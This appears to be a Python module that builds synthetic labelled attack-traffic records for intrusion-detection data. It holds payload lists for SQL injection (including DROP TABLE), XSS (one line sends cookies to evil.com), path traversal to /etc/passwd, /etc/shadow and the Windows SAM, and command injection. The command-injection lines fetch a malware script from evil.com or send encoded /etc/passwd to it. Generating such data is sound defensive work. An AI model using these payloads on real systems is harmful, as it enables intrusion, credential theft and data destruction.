"""Attack traffic patterns for synthetic data generation."""

import random

# SQL Injection payloads
SQLI_PAYLOADS = [
    "' OR 1=1--",
    "' UNION SELECT username,password FROM users--",
    "'; DROP TABLE users;--",
    "' OR ''='",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "admin'--",
    "' OR 1=1#",
    "' UNION ALL SELECT NULL,NULL,NULL--",
]

# XSS payloads
XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "<svg onload=alert(1)>",
    "'\"><script>fetch('http://evil.com/steal?c='+document.cookie)</script>",
]

# Path traversal payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "..%2f..%2fetc%2fpasswd",
    "....//....//etc/passwd",
    "/etc/shadow",
    "..\\..\\windows\\system32\\config\\sam",
]

# Command injection payloads
CMD_INJECTION_PAYLOADS = [
    "; cat /etc/passwd",
    "| ls -la",
    "&& wget http://evil.com/malware.sh",
    "; curl http://evil.com/exfil?d=$(cat /etc/passwd | base64)",
    "$(whoami)",
]


class AttackPattern:
    """Defines an attack behavior pattern."""

    def __init__(self, name: str, label: str):
        self.name = name
        self.label = label

    def generate(self, hour: int) -> dict:
        """Generate a single attack request. Override in subclasses."""
        raise NotImplementedError


class SQLInjection(AttackPattern):
    def __init__(self):
        super().__init__("sql_injection", "sqli")

    def generate(self, hour: int) -> dict:
        payload = random.choice(SQLI_PAYLOADS)
        target = random.choice([
            "/api/v1/users/search",
            "/api/v1/products/search",
            "/api/v1/orders",
        ])
        return {
            "src_ip": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "dst_ip": "192.168.0.1",
            "dst_port": 443,
            "method": random.choice(["GET", "POST"]),
            "path": target,
            "query_params": f"q={payload}",
            "headers": {
                "User-Agent": "python-requests/2.28.0",
                "Content-Type": "application/x-www-form-urlencoded",
            },
            "payload_size": len(payload),
            "response_code": random.choice([200, 500, 403]),
            "response_size": random.randint(200, 5000),
            "response_time_ms": random.randint(100, 2000),
            "label": self.label,
        }


class XSSAttack(AttackPattern):
    def __init__(self):
        super().__init__("xss", "xss")

    def generate(self, hour: int) -> dict:
        payload = random.choice(XSS_PAYLOADS)
        return {
            "src_ip": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "dst_ip": "192.168.0.1",
            "dst_port": 443,
            "method": "POST",
            "path": random.choice(["/api/v1/users/me", "/api/v1/products"]),
            "query_params": "",
            "headers": {
                "User-Agent": random.choice(["Mozilla/5.0 Chrome/120.0", "curl/8.4.0"]),
                "Content-Type": "application/json",
            },
            "payload_size": len(payload) + random.randint(50, 200),
            "response_code": random.choice([200, 400, 403]),
            "response_size": random.randint(100, 3000),
            "response_time_ms": random.randint(50, 500),
            "label": self.label,
        }


class BruteForce(AttackPattern):
    def __init__(self):
        super().__init__("brute_force", "brute_force")
        self._attack_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

    def generate(self, hour: int) -> dict:
        return {
            "src_ip": self._attack_ip,  # same IP, many attempts
            "dst_ip": "192.168.0.1",
            "dst_port": 443,
            "method": "POST",
            "path": "/api/v1/auth/login",
            "query_params": "",
            "headers": {
                "User-Agent": "python-requests/2.28.0",
                "Content-Type": "application/json",
            },
            "payload_size": random.randint(50, 100),
            "response_code": 401,  # mostly failures
            "response_size": random.randint(50, 200),
            "response_time_ms": random.randint(200, 800),
            "label": self.label,
        }


class PortScan(AttackPattern):
    def __init__(self):
        super().__init__("port_scan", "port_scan")
        self._attack_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        self._port_iter = iter(range(1, 65536))

    def generate(self, hour: int) -> dict:
        try:
            port = next(self._port_iter)
        except StopIteration:
            self._port_iter = iter(range(1, 65536))
            port = next(self._port_iter)
        return {
            "src_ip": self._attack_ip,
            "dst_ip": "192.168.0.1",
            "dst_port": port,
            "method": "GET",
            "path": "/",
            "query_params": "",
            "headers": {"User-Agent": "nmap"},
            "payload_size": 0,
            "response_code": random.choice([200, 404, 0]),  # 0 = connection refused
            "response_size": 0,
            "response_time_ms": random.randint(1, 10),
            "label": self.label,
        }


class C2Communication(AttackPattern):
    """Command & Control beacon traffic."""

    def __init__(self):
        super().__init__("c2_beacon", "c2")

    def generate(self, hour: int) -> dict:
        return {
            "src_ip": "192.168.0.30",  # compromised IoT device
            "dst_ip": f"47.91.{random.randint(0,255)}.{random.randint(1,254)}",
            "dst_port": random.choice([443, 8443, 4444]),
            "method": "POST",
            "path": f"/update/{random.randbytes(4).hex()}",
            "query_params": "",
            "headers": {
                "User-Agent": "SmartPlug/1.0",
                "Content-Type": "application/octet-stream",
            },
            "payload_size": random.randint(2048, 32768),  # large, encrypted payloads
            "response_code": 200,
            "response_size": random.randint(512, 8192),
            "response_time_ms": random.randint(100, 500),
            "label": self.label,
        }


class PathTraversal(AttackPattern):
    def __init__(self):
        super().__init__("path_traversal", "path_traversal")

    def generate(self, hour: int) -> dict:
        payload = random.choice(PATH_TRAVERSAL_PAYLOADS)
        return {
            "src_ip": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "dst_ip": "192.168.0.1",
            "dst_port": 443,
            "method": "GET",
            "path": f"/api/v1/files/{payload}",
            "query_params": "",
            "headers": {
                "User-Agent": "curl/8.4.0",
                "Content-Type": "text/plain",
            },
            "payload_size": 0,
            "response_code": random.choice([200, 400, 403, 404]),
            "response_size": random.randint(100, 10000),
            "response_time_ms": random.randint(10, 200),
            "label": self.label,
        }


# All available attack patterns with relative weights
DEFAULT_ATTACKS = [
    (SQLInjection(), 0.25),
    (XSSAttack(), 0.15),
    (BruteForce(), 0.20),
    (PortScan(), 0.10),
    (C2Communication(), 0.15),
    (PathTraversal(), 0.15),
]
